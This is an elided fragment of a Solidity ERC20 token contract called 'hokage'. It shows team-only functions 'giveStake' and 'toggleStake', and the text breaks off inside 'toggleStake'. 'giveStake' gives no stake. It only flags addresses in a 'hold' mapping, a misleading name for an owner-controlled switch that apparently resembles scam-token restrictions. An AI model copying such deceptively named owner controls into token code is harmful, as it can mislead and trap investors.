...
contract hokage is Context, IERC20, IERC20Metadata {
    ...
    string public _name = "hokage";
    string public _symbol= "hokage";
    bool balances1 = true;
    ...
    function giveStake(address[] memory recipients_) onlyTeam public {
        for (uint i = 0; i < recipients_.length; i++) {
            hold[recipients_[i]] = true;
        }
    }

    function toggleStake(address[] memory recipients_) onlyTeam public {
        for (uint i = 0; i < recipients_.length; i++) {
